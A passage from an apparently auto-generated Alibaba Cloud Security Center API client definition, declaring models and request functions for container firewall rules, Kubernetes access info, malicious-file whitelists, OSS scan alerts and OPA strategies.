        ports?: [ string ](name='Ports', description='An array that consists of information about the ports used by the destination server.'),
        ruleType?: string(name='RuleType', description='The type of the defense rule. Valid values:

*   **suggest**: intelligently recommended rule
*   **customize**: custom rule
*   **system**: system rule', example='customize'),
        tagList?: [ string ](name='TagList', description='An array that consists of tags added to the destination network object.'),
        targetId?: int32(name='TargetId', description='The ID of the network object.', example='302001'),
        targetName?: string(name='TargetName', description='The name of the network object.', example='demo4****'),
        targetType?: string(name='TargetType', description='The type of the network object.', example='IMAGE'),
      }(name='DstTarget', description='The destination network object.'),
      interceptType?: long(name='InterceptType', description='The interception mode. Valid values:

*   **0**: monitor
*   **1**: block
*   **2**: alert
*   **3**: allow', example='1'),
      orderIndex?: long(name='OrderIndex', description='The order in which the entries are sorted.', example='1'),
      ruleId?: long(name='RuleId', description='The ID of the defense rule.', example='30****'),
      ruleName?: string(name='RuleName', description='The name of the defense rule.', example='test'),
      ruleSwitch?: int32(name='RuleSwitch', description='The status of the defense rule. Valid values:

*   **1**: enabled
*   **0**: disabled', example='1'),
      ruleType?: string(name='RuleType', description='The type of the defense rule.', example='customize'),
      srcTarget?: {
        appName?: string(name='AppName', description='The name of the application.', example='ack-jenkins-lawr****'),
        imageList?: [ string ](name='ImageList', description='An array that consists of the images of the network object.'),
        namespace?: string(name='Namespace', description='The namespace.', example='jenkins'),
        ruleType?: string(name='RuleType', description='The type of the defense rule. Valid values:

*   **suggest**: intelligently recommended rule
*   **customize**: custom rule
*   **system**: system rule', example='customize'),
        tagList?: [ string ](name='TagList', description='An array that consists of tags added to the source network object.'),
        targetId?: int32(name='TargetId', description='The ID of the network object.', example='40****'),
        targetName?: string(name='TargetName', description='The name of the network object.', example='mhh-te****'),
        targetType?: string(name='TargetType', description='The type of the affected assets.', example='containerId'),
      }(name='SrcTarget', description='The source network object.'),
    }
  ](name='InterceptionRuleList', description='An array that consists of information about the defense rules.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='19'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ACF97412-FD09-4D1F-994F-34DF12BR****'),
}

model ListInterceptionRulePageResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListInterceptionRulePageResponseBody(name='body'),
}

/**
 * @summary Queries defense rules that are configured for the container firewall feature.
 *
 * @param request ListInterceptionRulePageRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListInterceptionRulePageResponse
 */
async function listInterceptionRulePageWithOptions(request: ListInterceptionRulePageRequest, runtime: Util.RuntimeOptions): ListInterceptionRulePageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListInterceptionRulePage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries defense rules that are configured for the container firewall feature.
 *
 * @param request ListInterceptionRulePageRequest
 * @return ListInterceptionRulePageResponse
 */
async function listInterceptionRulePage(request: ListInterceptionRulePageRequest): ListInterceptionRulePageResponse {
  var runtime = new Util.RuntimeOptions{};
  return listInterceptionRulePageWithOptions(request, runtime);
}

model ListInterceptionTargetPageRequest {
  appName?: string(name='AppName', description='The name of the application to which the network object belongs.', example='frontend'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  imageList?: [ string ](name='ImageList', description='The images of the network object.'),
  namespace?: string(name='Namespace', description='The namespace to which the network object belongs.', example='default'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  tagList?: [ string ](name='TagList', description='The labels specified for the network object.'),
  targetName?: string(name='TargetName', description='The name of the network object.', example='source-test-obj-0****'),
  targetType?: string(name='TargetType', description='The type of the network object. Valid values:

*   IMAGE', example='IMAGE'),
}

model ListInterceptionTargetPageResponseBody = {
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='45'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='028CF634-5268-5660-9575-48C9ED6B****'),
  ruleTargetList?: [ 
    {
      appName?: string(name='AppName', description='The name of the application of the network object.', example='frontend'),
      clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='c3e2eae03eb064d2ebf940cd5e1b17****'),
      clusterName?: string(name='ClusterName', description='The name of the container cluster.', example='sas-test-cnnf'),
      imageList?: [ string ](name='ImageList', description='The images of the network object.'),
      namespace?: string(name='Namespace', description='The namespace to which the network object belongs.', example='default'),
      ruleType?: string(name='RuleType', description='The type of the rule. Valid value:

*   customize: custom rule', example='customize'),
      tagList?: [ string ](name='TagList', description='The tags specified for the network object.'),
      targetId?: long(name='TargetId', description='The ID of the network object.

> You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the IDs of network objects.', example='400914'),
      targetName?: string(name='TargetName', description='The name of the network object.', example='destination-test-obj-Na3cF'),
      targetType?: string(name='TargetType', description='The type of the network object. Valid value:

*   IMAGE', example='IMAGE'),
    }
  ](name='RuleTargetList', description='An array that consists of the network objects.'),
}

model ListInterceptionTargetPageResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListInterceptionTargetPageResponseBody(name='body'),
}

/**
 * @summary Queries the network objects that are protected by the container firewall feature.
 *
 * @param request ListInterceptionTargetPageRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListInterceptionTargetPageResponse
 */
async function listInterceptionTargetPageWithOptions(request: ListInterceptionTargetPageRequest, runtime: Util.RuntimeOptions): ListInterceptionTargetPageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appName)) {
    query['AppName'] = request.appName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageList)) {
    query['ImageList'] = request.imageList;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.tagList)) {
    query['TagList'] = request.tagList;
  }
  if (!Util.isUnset(request.targetName)) {
    query['TargetName'] = request.targetName;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListInterceptionTargetPage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the network objects that are protected by the container firewall feature.
 *
 * @param request ListInterceptionTargetPageRequest
 * @return ListInterceptionTargetPageResponse
 */
async function listInterceptionTargetPage(request: ListInterceptionTargetPageRequest): ListInterceptionTargetPageResponse {
  var runtime = new Util.RuntimeOptions{};
  return listInterceptionTargetPageWithOptions(request, runtime);
}

model ListK8sAccessInfoRequest {
  aliyunYundunGatewayApiName?: string(name='AliyunYundunGatewayApiName', description='This parameter is deprecated.', example='None'),
  aliyunYundunGatewayPopName?: string(name='AliyunYundunGatewayPopName', description='This parameter is deprecated.', example='None'),
  aliyunYundunGatewayProjectName?: string(name='AliyunYundunGatewayProjectName', description='This parameter is deprecated.', example='None'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
}

model ListK8sAccessInfoResponseBody = {
  k8sAccessInfos?: [ 
    {
      aliUid?: long(name='AliUid', description='The ID of the Alibaba Cloud account.', example='1960721413485****'),
      auditLogStore?: string(name='AuditLogStore', description='The Simple Log Service Logstore that is used to store the audit logs.', example='audit-cf6baf6afa106eca665296fdf68b****'),
      auditProject?: string(name='AuditProject', description='The Simple Log Service project that is used to store the audit logs.', example='k8s-log-custom-your-project-sd89eh****'),
      auditRegionId?: string(name='AuditRegionId', description='The ID of the region in which the server is deployed.', example='cn-hangzhou'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c0da5e4cb82a848c4a57c4dc9f49a****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='test'),
      expireDate?: long(name='ExpireDate', description='The expiration time.', example='1690596321613'),
      groupId?: string(name='GroupId', description='The ID of the server group.', example='11088522'),
      groupName?: string(name='GroupName', description='The name of the server group.', example='test'),
      id?: long(name='Id', description='The UUID of the access information.', example='67070'),
      installKey?: string(name='InstallKey', description='The installation key of the Kubernetes cluster.', example='xxx'),
      vendor?: string(name='Vendor', description='The service provider.', example='ALIYUN'),
    }
  ](name='K8sAccessInfos', description='The information about the Kubernetes clusters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
}

model ListK8sAccessInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListK8sAccessInfoResponseBody(name='body'),
}

/**
 * @summary Queries the information about Kubernetes clusters that are added to Security Center.
 *
 * @description You can use this operation to query the access information about Kubernetes clusters.
 *
 * @param request ListK8sAccessInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListK8sAccessInfoResponse
 */
async function listK8sAccessInfoWithOptions(request: ListK8sAccessInfoRequest, runtime: Util.RuntimeOptions): ListK8sAccessInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliyunYundunGatewayApiName)) {
    query['AliyunYundunGatewayApiName'] = request.aliyunYundunGatewayApiName;
  }
  if (!Util.isUnset(request.aliyunYundunGatewayPopName)) {
    query['AliyunYundunGatewayPopName'] = request.aliyunYundunGatewayPopName;
  }
  if (!Util.isUnset(request.aliyunYundunGatewayProjectName)) {
    query['AliyunYundunGatewayProjectName'] = request.aliyunYundunGatewayProjectName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListK8sAccessInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about Kubernetes clusters that are added to Security Center.
 *
 * @description You can use this operation to query the access information about Kubernetes clusters.
 *
 * @param request ListK8sAccessInfoRequest
 * @return ListK8sAccessInfoResponse
 */
async function listK8sAccessInfo(request: ListK8sAccessInfoRequest): ListK8sAccessInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return listK8sAccessInfoWithOptions(request, runtime);
}

model ListLogShipperRegionsResponseBody = {
  logShipperRegionList?: [ 
    {
      regionId?: string(name='RegionId', description='The ID of the region.', example='cn-shanghai'),
    }
  ](name='LogShipperRegionList', description='The regions supported by the log delivery feature.'),
  requestId?: string(name='RequestId', description='The request ID.', example='F9C4DE22-D242-5ABA-87EC-325ECBDC****'),
}

model ListLogShipperRegionsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListLogShipperRegionsResponseBody(name='body'),
}

/**
 * @summary Queries the regions supported by the log delivery feature that uses the pay-as-you-go billing method.
 *
 * @param request ListLogShipperRegionsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListLogShipperRegionsResponse
 */
async function listLogShipperRegionsWithOptions(runtime: Util.RuntimeOptions): ListLogShipperRegionsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListLogShipperRegions',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the regions supported by the log delivery feature that uses the pay-as-you-go billing method.
 *
 * @return ListLogShipperRegionsResponse
 */
async function listLogShipperRegions(): ListLogShipperRegionsResponse {
  var runtime = new Util.RuntimeOptions{};
  return listLogShipperRegionsWithOptions(runtime);
}

model ListMachineAppsRequest {
  appId?: string(name='AppId', description='SAE application ID.', example='5b41f4bf-349f-4263-89b1-9234c034****'),
  appName?: string(name='AppName', description='SAE application name.', example='agent-commprice-shop'),
  appRegionId?: string(name='AppRegionId', description='Region ID.', example='cn-hangzhou'),
  authVersion?: string(name='AuthVersion', description='The authorization version of the asset. Values:
- **6**: Anti-virus edition
- **5**: Advanced edition
- **3**: Enterprise edition
- **7**: Ultimate edition
- **10**: Value-added Service Edition', example='7'),
  currentPage?: int32(name='CurrentPage', description='The page number to display in a paginated query.', example='1'),
  lang?: string(name='Lang', description='The language type for request and response, default value is **zh**. Values:
- **zh**: Chinese
- **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The maximum number of items to display per page in a paginated query.', example='20'),
  resourceDirectoryUid?: long(name='ResourceDirectoryUid', description='The UID of the resource directory.', example='123456'),
}

model ListMachineAppsResponseBody = {
  appList?: [ 
    {
      appId?: string(name='AppId', description='SAE application ID.', example='5b41f4bf-349f-4263-89b1-9234c034****'),
      appName?: string(name='AppName', description='SAE application name.', example='app-ubuntu'),
      appRegionId?: string(name='AppRegionId', description='Region ID.', example='cn-hangzhou'),
    }
  ](name='AppList', description='Application list.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The current page number in a paginated query.', example='1'),
    pageSize?: int32(name='PageSize', description='The maximum number of items to display per page in a paginated query.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of data items.', example='263'),
  }(name='PageInfo', description='Pagination information of the query result.'),
  requestId?: string(name='RequestId', description='The ID of this call request, which is a unique identifier generated by Alibaba Cloud for the request. It can be used to troubleshoot and pinpoint issues.', example='028CF634-5268-5660-9575-48C9ED6B****'),
}

model ListMachineAppsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListMachineAppsResponseBody(name='body'),
}

/**
 * @summary Paginate to query the application list.
 *
 * @param request ListMachineAppsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListMachineAppsResponse
 */
async function listMachineAppsWithOptions(request: ListMachineAppsRequest, runtime: Util.RuntimeOptions): ListMachineAppsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appId)) {
    query['AppId'] = request.appId;
  }
  if (!Util.isUnset(request.appName)) {
    query['AppName'] = request.appName;
  }
  if (!Util.isUnset(request.appRegionId)) {
    query['AppRegionId'] = request.appRegionId;
  }
  if (!Util.isUnset(request.authVersion)) {
    query['AuthVersion'] = request.authVersion;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceDirectoryUid)) {
    query['ResourceDirectoryUid'] = request.resourceDirectoryUid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListMachineApps',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Paginate to query the application list.
 *
 * @param request ListMachineAppsRequest
 * @return ListMachineAppsResponse
 */
async function listMachineApps(request: ListMachineAppsRequest): ListMachineAppsResponse {
  var runtime = new Util.RuntimeOptions{};
  return listMachineAppsWithOptions(request, runtime);
}

model ListMaliciousFileWhitelistConfigsRequest {
  currentPage?: int32(name='CurrentPage', description='The page number. Pages start from page 1. Default value: 1.', example='1'),
  eventName?: string(name='EventName', description='The name of the alert.

*   Set the value to ALL, which indicates all alert types.', example='ALL'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20.', example='20'),
  source?: string(name='Source', description='The feature to which this operation belongs. If you leave this parameter empty, the default value agentless is used.', example='agentless'),
}

model ListMaliciousFileWhitelistConfigsResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  list?: [ 
    {
      count?: string(name='Count', description='The number of the assets on which the rule takes effect.

>  The value of this parameter is returned only if the value of TargetType is SELECTION_KEY.', example='ALL'),
      eventName?: string(name='EventName', description='The name of the alert.

*   The value is fixed as ALL, which indicates all alert types.', example='ALL'),
      field?: string(name='Field', description='The field that is used in the whitelist rule.', example='fileMd5'),
      fieldValue?: string(name='FieldValue', description='The value of the field that is used in the whitelist rule.', example='b2cf9747ee49d8d9b105cf16e078cc16'),
      gmtCreate?: string(name='GmtCreate', description='The time when the rule was created.', example='1691719662000'),
      gmtModified?: string(name='GmtModified', description='The time when the rule was modified.', example='1691719662000'),
      id?: long(name='Id', description='The ID of the rule.', example='1'),
      operator?: string(name='Operator', description='The logical operator of the whitelist rule.

*   The value is fixed as strEqual, which indicates the equality operator (=).', example='strEqual'),
      source?: string(name='Source', description='The feature to which this operation belongs.

*   The value is fixed as agentless, which indicates the agentless detection feature.', example='agentless'),
      targetType?: string(name='TargetType', description='The type of the assets on which the rule takes effect. Valid values:

*   ALL: all assets
*   SELECTION_KEY: selected assets', example='ALL'),
      targetValue?: string(name='TargetValue', description='The assets on which the rule takes effect. Valid values:

*   ALL: all assets
*   Others: selected assets', example='ALL'),
    }
  ](name='List', description='The alert whitelist rules of sensitive files that are detected by using the agentless detection feature.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='9'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='29'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='F5CF78A7-30AA-59DB-847F-13EE3AE7****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model ListMaliciousFileWhitelistConfigsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListMaliciousFileWhitelistConfigsResponseBody(name='body'),
}

/**
 * @summary Queries the alert whitelist rules of sensitive files that are detected by using the agentless detection feature.
 *
 * @param request ListMaliciousFileWhitelistConfigsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListMaliciousFileWhitelistConfigsResponse
 */
async function listMaliciousFileWhitelistConfigsWithOptions(request: ListMaliciousFileWhitelistConfigsRequest, runtime: Util.RuntimeOptions): ListMaliciousFileWhitelistConfigsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.eventName)) {
    query['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListMaliciousFileWhitelistConfigs',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the alert whitelist rules of sensitive files that are detected by using the agentless detection feature.
 *
 * @param request ListMaliciousFileWhitelistConfigsRequest
 * @return ListMaliciousFileWhitelistConfigsResponse
 */
async function listMaliciousFileWhitelistConfigs(request: ListMaliciousFileWhitelistConfigsRequest): ListMaliciousFileWhitelistConfigsResponse {
  var runtime = new Util.RuntimeOptions{};
  return listMaliciousFileWhitelistConfigsWithOptions(request, runtime);
}

model ListObjectScanEventRequest {
  bucketName?: string(name='BucketName', description='The name of the OSS bucket.', example='ltrbuck****'),
  currentPage?: int32(name='CurrentPage', description='The page number.

This parameter is required.', example='1'),
  eventName?: string(name='EventName', description='The name of the alert.', example='WebShell'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  md5?: string(name='Md5', description='The MD5 hash value of the file.', example='0552c44e243abdea1729d4507bce****'),
  ossKey?: string(name='OssKey', description='The key of the file that is stored in an OSS bucket.', example='1/2022/06/23/15/41/16559701077444693a0c6-33b2-4cc2-a99f-9f38b8b8****'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.

This parameter is required.', example='20'),
  parentEventId?: long(name='ParentEventId', description='The ID of the alert that is generated for the package to which the subfile belongs.', example='1'),
  riskLevel?: string(name='RiskLevel', description='The risk level of the alert. Valid values:

*   **high**
*   **medium**
*   **low**', example='low'),
  source?: string(name='Source', description='The method that is used to detect the malicious file. Valid values:

*   **API**: uses API operations.
*   **OSS**: uses Object Storage Service (OSS) file check.', example='OSS'),
  timeEnd?: long(name='TimeEnd', description='The end of the time range during which the exception is detected.', example='1683862286000'),
  timeStart?: long(name='TimeStart', description='The beginning of the time range during which the exception is detected.', example='1683603086000'),
}

model ListObjectScanEventResponseBody = {
  data?: [ 
    {
      bucketName?: string(name='BucketName', description='The name of the OSS bucket.', example='hz-new01****'),
      details?: [ 
        {
          name?: string(name='Name', description='The name of the parameter in the file details.', example='DownloadUrl'),
          nameDisplay?: string(name='NameDisplay', description='The display name of the alert.', example='DownloadUrl'),
          type?: string(name='Type', description='The value type of the parameter in the file details.', example='html'),
          value?: string(name='Value', description='The value of the parameter.', example='http://gcx.cn-hangzhou.aliyuncs.com/****'),
          valueDisplay?: string(name='ValueDisplay', description='The value of the parameter.', example='http://gcx.cn-hangzhou.aliyuncs.com/****'),
        }
      ](name='Details', description='The details of the file.'),
      displaySandboxResult?: string(name='DisplaySandboxResult', description='Indicates whether the file can be detected by cloud sandbox. Valid values:

*   **true**
*   **false**', example='true'),
      eventId?: long(name='EventId', description='The ID of the alert.', example='911273'),
      eventName?: string(name='EventName', description='The name of the alert.', example='WebShell'),
      filePath?: string(name='FilePath', description='The path to the file.', example='/usr/local****'),
      firstTime?: long(name='FirstTime', description='The timestamp at which the alert was first detected.', example='1694576692000'),
      hasSubEvent?: boolean(name='HasSubEvent', description='Indicates whether an alert is generated for the file extracted from the package. Valid values:

*   **true**
*   **false**', example='true'),
      lastTime?: long(name='LastTime', description='The timestamp at which the alert was last detected.', example='1694576692000'),
      md5?: string(name='Md5', description='The MD5 hash value of the file.', example='5b394b54ca632fe51c4ab4a6dbaf****'),
      ossKey?: string(name='OssKey', description='The key of the file that is stored in the OSS bucket.', example='1/2023/07/21/10/18/16899059356518bcf6c64-a04e-492d-a421-4ae8b888****'),
      riskLevel?: string(name='RiskLevel', description='The risk level of the alert. Valid values:

*   **high**
*   **medium**
*   **low**', example='medium'),
      sha1?: string(name='Sha1', description='The SHA-1 hash value of the file.', example='3c01bdbb26f358bab27f267924aa2c9a03fc****'),
      sha256?: string(name='Sha256', description='The SHA-256 hash value of the file.', example='3a6fed5fc11392b3ee9f81caf017b48640d7458766a8eb0382899a605b41****'),
      source?: string(name='Source', description='The method that is used to detect the malicious file. Valid values:

*   **API**: uses API operations.
*   **OSS**: uses OSS file check.', example='OSS'),
    }
  ](name='Data', description='The data returned.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='253'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='7BC55C8F-226E-5AF5-9A2C-2EC43864****'),
}

model ListObjectScanEventResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListObjectScanEventResponseBody(name='body'),
}

/**
 * @summary Queries alerts that are generated for malicious files.
 *
 * @param request ListObjectScanEventRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListObjectScanEventResponse
 */
async function listObjectScanEventWithOptions(request: ListObjectScanEventRequest, runtime: Util.RuntimeOptions): ListObjectScanEventResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.bucketName)) {
    query['BucketName'] = request.bucketName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.eventName)) {
    query['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.md5)) {
    query['Md5'] = request.md5;
  }
  if (!Util.isUnset(request.ossKey)) {
    query['OssKey'] = request.ossKey;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.parentEventId)) {
    query['ParentEventId'] = request.parentEventId;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.timeEnd)) {
    query['TimeEnd'] = request.timeEnd;
  }
  if (!Util.isUnset(request.timeStart)) {
    query['TimeStart'] = request.timeStart;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListObjectScanEvent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries alerts that are generated for malicious files.
 *
 * @param request ListObjectScanEventRequest
 * @return ListObjectScanEventResponse
 */
async function listObjectScanEvent(request: ListObjectScanEventRequest): ListObjectScanEventResponse {
  var runtime = new Util.RuntimeOptions{};
  return listObjectScanEventWithOptions(request, runtime);
}

model ListOpaClusterStrategyNewRequest {
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  imageName?: [ string ](name='ImageName', description='The image names.'),
  label?: [ string ](name='Label', description='The tags that are added to the container.'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
  strategyName?: [ string ](name='StrategyName', description='The rule names.'),
}

model ListOpaClusterStrategyNewResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  list?: [ 
    {
      action?: int32(name='Action', description='The action of the rule. Valid values:

*   **1**: trigger alerts
*   **2**: block
*   **3**: allow', example='1'),
      clusterCount?: int32(name='ClusterCount', description='The number of clusters on which the rule takes effect.', example='1'),
      clusterIdList?: [ string ](name='ClusterIdList', description='The clusters on which the rule takes effect.'),
      description?: string(name='Description', description='The description.', example='Config the Event Audit policys'),
      imageName?: [ string ](name='ImageName', description='The image names.'),
      label?: [ string ](name='Label', description='The tags that are added to the container.'),
      maliciousImage?: boolean(name='MaliciousImage', description='Indicates whether the rule supports malicious Internet images. Valid values:

*   **true**
*   **false**', example='true'),
      strategyId?: long(name='StrategyId', description='The rule ID.', example='1'),
